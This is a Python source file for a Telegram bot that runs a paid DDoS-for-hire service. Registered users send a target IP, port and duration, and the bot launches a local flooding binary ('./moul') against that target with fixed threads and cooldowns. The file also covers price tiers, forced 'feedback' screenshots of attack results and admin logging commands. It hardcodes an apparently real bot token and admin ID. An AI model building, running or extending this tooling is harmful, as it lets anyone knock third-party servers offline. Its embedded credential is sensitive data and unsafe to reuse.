
import os
import json
import time
import random
import telebot
import subprocess
from datetime import datetime, timedelta

# Initialize bot with your token - REPLACE WITH YOUR OWN TOKEN
TOKEN = '7585657026:AAEMT-G1MDQnsLBLoWP-79QNRo1bIOQReYs'
bot = telebot.TeleBot(TOKEN)

# Admin ID - REPLACE WITH YOUR ADMIN ID
ADMIN_ID = 6696347739  # Replace with your actual Telegram ID

# Initialize necessary files/directories
if not os.path.exists('logs'):
    os.makedirs('logs')

if not os.path.exists('users.json'):
    with open('users.json', 'w') as f:
        json.dump({}, f)

# Data handling functions
def load_users():
    try:
        with open('users.json', 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(users, f, indent=4)

# User state tracking
user_state = {}
attack_processes = {}
attack_cooldowns = {}
feedback_pending = {}

# ASCII Art for initialization
start_animation = """
Initializing System...  
█████████ 100% [LOADED] ✅  
🔓 Unlocking Secure Gateway...  
█▒▒▒▒▒▒▒▒▒▒▒▒ 10%  
███▒▒▒▒▒▒▒▒▒▒ 30%  
█████▒▒▒▒▒▒▒▒ 50%  
███████▒▒▒▒▒▒ 70%  
█████████▒▒▒▒ 90%  
███████████ 100% ✅  
ACCESS GRANTED 🟢  

🦾 "Welcome, Cyber Warrior! Ready to Dominate the Dos service?"  
🔰 "But First, Verify Yourself…"
"""

# Function to generate CAPTCHA
def generate_captcha():
    captcha = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(6))
    return captcha

# Function to log attack information
def log_attack(user_id, username, ip, port, time, threads):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_data = f"[{timestamp}] User ID: {user_id} | Username: {username} | Attack: {ip}:{port} | Time: {time}s | Threads: {threads}\n"
    
    # Log to daily file
    date_str = datetime.now().strftime("%Y-%m-%d")
    log_file = f"logs/attack_log_{date_str}.txt"
    
    with open(log_file, 'a') as f:
        f.write(log_data)
    
    return log_file

# Start command handler
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Send initialization animation
    for i in range(0, len(start_animation), 50):
        bot.send_message(chat_id, start_animation[i:i+50])
        time.sleep(0.5)
    
    # Check if user is already verified
    users = load_users()
    str_user_id = str(user_id)
    
    if str_user_id in users and users[str_user_id].get('verified', False):
        bot.send_message(chat_id, "Welcome back to DDoS Attack System!")
        bot.send_message(chat_id, "/help to see available commands.")
        return
    
    # Start verification process
    captcha = generate_captcha()
    user_state[user_id] = {
        'state': 'captcha',
        'captcha': captcha
    }
    
    # Send CAPTCHA to user
    bot.send_message(chat_id, f"Please solve this CAPTCHA to verify yourself:\n\n{captcha}")

# Handle text messages for verification flow
@bot.message_handler(func=lambda message: message.from_user.id in user_state and user_state[message.from_user.id].get('state') in ['captcha', 'name'])
def handle_verification(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    text = message.text.strip()
    
    # Handle CAPTCHA verification
    if user_state[user_id]['state'] == 'captcha':
        if text == user_state[user_id]['captcha']:
            bot.send_message(chat_id, "CAPTCHA verified ✅")
            user_state[user_id]['state'] = 'name'
            bot.send_message(chat_id, "Please enter your name:")
        else:
            new_captcha = generate_captcha()
            user_state[user_id]['captcha'] = new_captcha
            bot.send_message(chat_id, f"Incorrect CAPTCHA. Try again:\n\n{new_captcha}")
    
    # Handle name submission
    elif user_state[user_id]['state'] == 'name':
        user_state[user_id]['name'] = text
        user_state[user_id]['state'] = 'terms'
        
        # Send welcome and terms agreement
        bot.send_message(chat_id, f"Welcome, {text}!")
        
        # Notify admin about new user
        admin_msg = f"🔔 New User Registration\nUser ID: {user_id}\nUsername: @{message.from_user.username or 'None'}\nName: {text}"
        bot.send_message(ADMIN_ID, admin_msg)
        
        # Ask for feedback agreement
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(
            telebot.types.InlineKeyboardButton("✅ YES", callback_data="terms_yes"),
            telebot.types.InlineKeyboardButton("❌ NO", callback_data="terms_no")
        )
        
        bot.send_message(
            chat_id, 
            "Will you send feedback (photo) after every match?",
            reply_markup=markup
        )

# Handle terms agreement
@bot.callback_query_handler(func=lambda call: call.data.startswith("terms_"))
def handle_terms(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    
    # Delete the original message
    bot.delete_message(chat_id, message_id)
    
    if call.data == "terms_yes":
        # Save user info
        users = load_users()
        str_user_id = str(user_id)
        
        users[str_user_id] = {
            'name': user_state[user_id]['name'],
            'username': call.from_user.username,
            'join_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'verified': True,
            'feedback_pending': False
        }
        
        save_users(users)
        
        # Clean up user state
        if user_id in user_state:
            del user_state[user_id]
        
        # Show help automatically
        bot.send_message(chat_id, "Thanks for agreeing! Here are available commands:")
        help_command(call.message)
        
    elif call.data == "terms_no":
        bot.send_message(chat_id, "⚠ ACCESS DENIED: Get Lost!")
        
        # Clean up user state
        if user_id in user_state:
            del user_state[user_id]

# Help command handler
@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Verify user
    users = load_users()
    str_user_id = str(user_id)
    
    if str_user_id not in users or not users[str_user_id].get('verified', False):
        bot.send_message(chat_id, "Please use /start to register first.")
        return
    
    # Check for pending feedback
    if users[str_user_id].get('feedback_pending', False):
        bot.send_message(chat_id, "🚨 SYSTEM ALERT 🚨\n❌ ACTION BLOCKED!\n⚠ Send Feedback to Continue...\nOtherwise, Wait for Admin Approval.")
        return
    
    help_text = """
✅ Commands Available:
1️⃣ /at <ip> <port> <time> → Free users' attack command.
2️⃣ /report → Send error reports to admin.
3️⃣ /buy → View paid plans & contact admin.
"""
    
    bot.send_message(chat_id, help_text)

# Attack command handler
@bot.message_handler(commands=['at'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Verify user
    users = load_users()
    str_user_id = str(user_id)
    
    if str_user_id not in users or not users[str_user_id].get('verified', False):
        bot.send_message(chat_id, "Please use /start to register first.")
        return
    
    # Check for pending feedback
    if users[str_user_id].get('feedback_pending', False):
        bot.send_message(chat_id, "🚨 SYSTEM ALERT 🚨\n❌ ACTION BLOCKED!\n⚠ Send Feedback to Continue...\nOtherwise, Wait for Admin Approval.")
        return
    
    # Parse command arguments
    parts = message.text.split()
    if len(parts) != 4:
        bot.send_message(chat_id, "❌ Incorrect format. Usage: /at <ip> <port> <time>")
        return
    
    _, ip, port_str, time_str = parts
    
    # Validate parameters
    try:
        port = int(port_str)
        attack_time = int(time_str)
        
        # Check if port is valid
        if port < 1 or port > 65535:
            bot.send_message(chat_id, "❌ Invalid port. Must be between 1 and 65535.")
            return
        
        # Check time limits
        if attack_time < 1:
            bot.send_message(chat_id, "❌ Attack time must be at least 1 second.")
            return
    except ValueError:
        bot.send_message(chat_id, "❌ Port and time must be valid numbers.")
        return
    
    # Check if user already has an attack running
    if user_id in attack_processes and attack_processes[user_id]['process'] is not None:
        bot.send_message(
            chat_id,
            "🚨 SYSTEM ALERT 🚨\n❌ ATTACK DENIED!\n⚠ You already have an attack running.\n⏳ Please wait for completion..."
        )
        return
    
    # Check cooldown for new IP
    current_time = time.time()
    if user_id in attack_cooldowns:
        last_attack = attack_cooldowns[user_id]
        # If it's a new IP and cooldown is active
        if last_attack['ip'] != ip and current_time - last_attack['time'] < 300:  # 5 minutes (300 seconds)
            remaining = int(300 - (current_time - last_attack['time']))
            bot.send_message(
                chat_id,
                f"🚨 SYSTEM ALERT 🚨\n❌ ATTACK DENIED!\n⚠ You must wait **5 minutes** before using a new IP!\n⏳ Time Left: {remaining}s"
            )
            return
    
    # Determine attack time based on IP history
    if user_id in attack_cooldowns and attack_cooldowns[user_id]['ip'] == ip:
        # Same IP+port, limit to 60 seconds
        max_time = 60
    else:
        # New IP+port, allow up to 230 seconds
        max_time = 230
    
    # Enforce time limit
    if attack_time > max_time:
        attack_time = max_time
        bot.send_message(chat_id, f"⚠️ Attack time limited to {max_time} seconds for this target.")
    
    # Set thread count (hidden from user)
    threads = 70
    
    # Log the attack
    log_file = log_attack(user_id, message.from_user.username, ip, port, attack_time, threads)
    
    # Execute attack command
    try:
        cmd = f"./moul {ip} {port} {attack_time} {threads}"
        process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Store process info
        attack_processes[user_id] = {
            'process': process,
            'ip': ip,
            'port': port,
            'time': attack_time,
            'start_time': current_time,
            'end_time': current_time + attack_time
        }
        
        # Update attack cooldown
        attack_cooldowns[user_id] = {
            'ip': ip,
            'time': current_time
        }
        
        # Send initial attack message
        attack_msg = bot.send_message(
            chat_id,
            f"🚀 ATTACK LAUNCHED! 🚀\n🎯 **Target:** {ip}:{port}\n⏳ **Time Left:** {attack_time} sec\n⚠ **Do NOT close the bot, attack in progress...**"
        )
        
        # Update countdown
        for i in range(attack_time, 0, -1):
            time.sleep(1)
            try:
                bot.edit_message_text(
                    f"🔥 ATTACK IN PROGRESS 🔥\n⏳ Time Left: {i} sec",
                    chat_id,
                    attack_msg.message_id
                )
            except:
                pass
            
            # Check if process has exited early
            if process.poll() is not None:
                break
        
        # Clean up process
        if process.poll() is None:  # If still running
            process.terminate()
        
        # Final message
        bot.edit_message_text(
            f"✅ ATTACK COMPLETED!\n🎯 Target: {ip}:{port}\n⏱️ Duration: {attack_time} sec",
            chat_id,
            attack_msg.message_id
        )
        
        # Mark feedback as pending
        users = load_users()
        users[str_user_id]['feedback_pending'] = True
        save_users(users)
        
        # Send feedback request
        bot.send_message(
            chat_id,
            "📸 Please send a screenshot/photo as feedback from your attack result."
        )
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ Attack failed: {str(e)}")
        
        # Log error
        with open(log_file, 'a') as f:
            f.write(f"[ERROR] Attack execution failed: {str(e)}\n")

# Report command handler
@bot.message_handler(commands=['report'])
def report_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Verify user
    users = load_users()
    str_user_id = str(user_id)
    
    if str_user_id not in users or not users[str_user_id].get('verified', False):
        bot.send_message(chat_id, "Please use /start to register first.")
        return
    
    # Check for pending feedback
    if users[str_user_id].get('feedback_pending', False):
        bot.send_message(chat_id, "🚨 SYSTEM ALERT 🚨\n❌ ACTION BLOCKED!\n⚠ Send Feedback to Continue...\nOtherwise, Wait for Admin Approval.")
        return
    
    # Ask for report details
    bot.send_message(chat_id, "Please describe the issue you're experiencing:")
    user_state[user_id] = {'state': 'waiting_report'}

# Buy command handler
@bot.message_handler(commands=['buy'])
def buy_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Verify user
    users = load_users()
    str_user_id = str(user_id)
    
    if str_user_id not in users or not users[str_user_id].get('verified', False):
        bot.send_message(chat_id, "Please use /start to register first.")
        return
    
    buy_text = """
✅ Paid users do NOT need to send feedback.
✅ Pricing:

1 Day = ₹10
7 Days = ₹50

✅ Contact Admin: @Mukeshchh999
"""
    
    bot.send_message(chat_id, buy_text)

# Handle feedback photo
@bot.message_handler(content_types=['photo'])
def handle_feedback(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Verify user
    users = load_users()
    str_user_id = str(user_id)
    
    if str_user_id not in users or not users[str_user_id].get('verified', False):
        bot.send_message(chat_id, "Please use /start to register first.")
        return
    
    # Check if feedback is pending
    if users[str_user_id].get('feedback_pending', True):
        # Forward the feedback to admin
        bot.forward_message(ADMIN_ID, chat_id, message.message_id)
        
        # Add caption for admin
        bot.send_message(
            ADMIN_ID,
            f"📸 Feedback from user:\nID: {user_id}\nName: {users[str_user_id].get('name', 'Unknown')}\nUsername: @{message.from_user.username or 'None'}"
        )
        
        # Mark feedback as received
        users[str_user_id]['feedback_pending'] = False
        save_users(users)
        
        bot.send_message(chat_id, "✅ Thank you for your feedback! You can now use the bot again.")
    else:
        bot.send_message(chat_id, "Thank you for the photo, but no feedback is currently required.")

# Handle report messages
@bot.message_handler(func=lambda message: message.from_user.id in user_state and user_state[message.from_user.id].get('state') == 'waiting_report')
def process_report(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Forward report to admin
    bot.forward_message(ADMIN_ID, chat_id, message.message_id)
    
    # Get user info
    users = load_users()
    str_user_id = str(user_id)
    user_name = users.get(str_user_id, {}).get('name', 'Unknown')
    
    # Add caption for admin
    bot.send_message(
        ADMIN_ID,
        f"📋 Report from user:\nID: {user_id}\nName: {user_name}\nUsername: @{message.from_user.username or 'None'}"
    )
    
    # Clean up state
    if user_id in user_state:
        del user_state[user_id]
    
    bot.send_message(chat_id, "✅ Your report has been sent to the admin. Thank you!")

# Admin commands

# Approve user
@bot.message_handler(commands=['approve'])
def approve_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        bot.send_message(chat_id, "❌ Incorrect format. Usage: /approve <userid> <days>")
        return
    
    try:
        target_id = parts[1]
        days = int(parts[2])
        
        users = load_users()
        
        if target_id in users:
            # Approve user
            users[target_id]['approved'] = True
            users[target_id]['feedback_pending'] = False
            users[target_id]['approval_days'] = days
            users[target_id]['approval_date'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            users[target_id]['expiry_date'] = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
            
            save_users(users)
            
            bot.send_message(chat_id, f"✅ User {target_id} approved for {days} days.")
            
            # Notify user
            try:
                bot.send_message(
                    int(target_id),
                    f"✅ Your access has been approved for {days} days!"
                )
            except:
                pass
        else:
            bot.send_message(chat_id, "❌ User not found.")
    except:
        bot.send_message(chat_id, "❌ Invalid parameters.")

# Disapprove user
@bot.message_handler(commands=['disapprove'])
def disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.send_message(chat_id, "❌ Incorrect format. Usage: /disapprove <userid>")
        return
    
    try:
        target_id = parts[1]
        users = load_users()
        
        if target_id in users:
            # Disapprove user
            users[target_id]['approved'] = False
            save_users(users)
            
            bot.send_message(chat_id, f"✅ User {target_id} has been blocked from using the bot.")
            
            # Notify user
            try:
                bot.send_message(
                    int(target_id),
                    "❌ Your access has been revoked by the admin."
                )
            except:
                pass
        else:
            bot.send_message(chat_id, "❌ User not found.")
    except:
        bot.send_message(chat_id, "❌ Invalid parameters.")

# View logs
@bot.message_handler(commands=['logs'])
def view_logs(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.send_message(chat_id, "❌ Incorrect format. Usage: /logs <userid>")
        return
    
    try:
        target_id = parts[1]
        
        # Collect log entries for this user
        log_entries = []
        log_files = [f for f in os.listdir('logs') if f.startswith('attack_log_')]
        
        for log_file in log_files:
            with open(f"logs/{log_file}", 'r') as f:
                lines = f.readlines()
                for line in lines:
                    if f"User ID: {target_id}" in line:
                        log_entries.append(line.strip())
        
        if log_entries:
            # Create a log file for this user
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            user_log_file = f"logs/user_{target_id}_{timestamp}.txt"
            
            with open(user_log_file, 'w') as f:
                f.write(f"Attack logs for User ID: {target_id}\n")
                f.write("-" * 50 + "\n")
                for entry in log_entries:
                    f.write(entry + "\n")
            
            # Send the log file
            with open(user_log_file, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"📋 Attack logs for User ID: {target_id}")
        else:
            bot.send_message(chat_id, f"❌ No logs found for User ID: {target_id}")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error retrieving logs: {str(e)}")

# Broadcast message
@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    broadcast_text = message.text.replace('/broadcast', '', 1).strip()
    
    if not broadcast_text:
        bot.send_message(chat_id, "❌ Please provide a message to broadcast.")
        return
    
    users = load_users()
    sent_count = 0
    failed_count = 0
    
    for user_id_str in users:
        try:
            bot.send_message(int(user_id_str), f"📢 *ANNOUNCEMENT*\n\n{broadcast_text}", parse_mode="Markdown")
            sent_count += 1
        except:
            failed_count += 1
    
    bot.send_message(
        chat_id,
        f"✅ Broadcast sent to {sent_count} users.\n❌ Failed for {failed_count} users."
    )

# View user details
@bot.message_handler(commands=['view'])
def view_users(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    users = load_users()
    
    approved_users = []
    free_users = []
    all_users = []
    
    for user_id_str, user_data in users.items():
        user_info = f"ID: {user_id_str}, Name: {user_data.get('name', 'Unknown')}, Username: @{user_data.get('username', 'None')}"
        
        all_users.append(user_info)
        
        if user_data.get('approved', False):
            approved_users.append(user_info)
        else:
            free_users.append(user_info)
    
    # Create a log file for all users
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    users_file = f"logs/all_users_{timestamp}.txt"
    
    with open(users_file, 'w') as f:
        f.write("ALL USERS\n")
        f.write("-" * 50 + "\n")
        f.write(f"Total users: {len(all_users)}\n")
        f.write(f"Approved users: {len(approved_users)}\n")
        f.write(f"Free users: {len(free_users)}\n\n")
        
        f.write("APPROVED USERS\n")
        f.write("-" * 50 + "\n")
        for user in approved_users:
            f.write(user + "\n")
        
        f.write("\nFREE USERS\n")
        f.write("-" * 50 + "\n")
        for user in free_users:
            f.write(user + "\n")
    
    # Send the file
    with open(users_file, 'rb') as f:
        bot.send_document(chat_id, f, caption=f"📋 User details - Total: {len(all_users)}")

# VIP command
@bot.message_handler(commands=['vip'])
def vip_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.send_message(chat_id, "❌ Incorrect format. Usage: /vip <userid>")
        return
    
    try:
        target_id = parts[1]
        users = load_users()
        
        if target_id in users:
            # Grant VIP access
            users[target_id]['vip'] = True
            users[target_id]['feedback_pending'] = False
            save_users(users)
            
            bot.send_message(chat_id, f"✅ User {target_id} has been granted VIP access.")
            
            # Notify user
            try:
                bot.send_message(
                    int(target_id),
                    "🌟 You have been granted VIP access by the admin!"
                )
            except:
                pass
        else:
            bot.send_message(chat_id, "❌ User not found.")
    except:
        bot.send_message(chat_id, "❌ Invalid parameters.")

# Generate logs for all users
@bot.message_handler(commands=['logsall'])
def logs_all_users(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    try:
        users = load_users()
        log_files = [f for f in os.listdir('logs') if f.startswith('attack_log_')]
        
        # Create a comprehensive log file with all users' activities
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        all_logs_file = f"logs/all_users_logs_{timestamp}.txt"
        
        with open(all_logs_file, 'w') as f:
            f.write("ALL USERS ATTACK LOGS\n")
            f.write("=" * 70 + "\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 70 + "\n\n")
            
            # Process each user
            for user_id_str, user_data in users.items():
                f.write(f"USER: {user_data.get('name', 'Unknown')}\n")
                f.write(f"ID: {user_id_str}\n")
                f.write(f"Username: @{user_data.get('username', 'None')}\n")
                f.write(f"Join Date: {user_data.get('join_date', 'Unknown')}\n")
                f.write(f"Status: {'Approved' if user_data.get('approved', False) else 'Free'}\n")
                if user_data.get('vip', False):
                    f.write("Type: VIP User\n")
                f.write("-" * 50 + "\n")
                f.write("ATTACK HISTORY:\n")
                
                # Collect all logs for this user
                user_logs = []
                for log_file in log_files:
                    with open(f"logs/{log_file}", 'r') as log_f:
                        lines = log_f.readlines()
                        for line in lines:
                            if f"User ID: {user_id_str}" in line:
                                user_logs.append(line.strip())
                
                if user_logs:
                    for log in user_logs:
                        f.write(f"{log}\n")
                else:
                    f.write("No attack history found.\n")
                
                f.write("\n" + "=" * 70 + "\n\n")
        
        # Send the complete log file
        with open(all_logs_file, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"📊 Complete logs for all {len(users)} users")
        
        bot.send_message(chat_id, f"✅ Successfully generated logs for all {len(users)} users.")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error generating logs: {str(e)}")

# Delete logs command
@bot.message_handler(commands=['dellogs'])
def delete_logs(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    try:
        # Count log files
        log_files = [f for f in os.listdir('logs') if f.endswith('.txt')]
        file_count = len(log_files)
        
        # Create backup of logs before deleting
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_file = f"logs_backup_{timestamp}.zip"
        
        import zipfile
        with zipfile.ZipFile(backup_file, 'w') as zipf:
            for file in log_files:
                zipf.write(os.path.join('logs', file))
        
        # Send backup to admin
        with open(backup_file, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"📂 Logs backup before deletion - {file_count} files")
        
        # Delete all log files
        for file in log_files:
            os.remove(os.path.join('logs', file))
        
        # Delete backup zip after sending
        os.remove(backup_file)
        
        bot.send_message(chat_id, f"✅ Successfully deleted {file_count} log files. Space has been freed.")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error deleting logs: {str(e)}")

# Start the bot
if __name__ == "__main__":
    print("Starting Attack Bot...")
    
    # Create logs directory if it doesn't exist
    if not os.path.exists('logs'):
        os.makedirs('logs')
    
    # Start polling
    bot.polling(none_stop=True)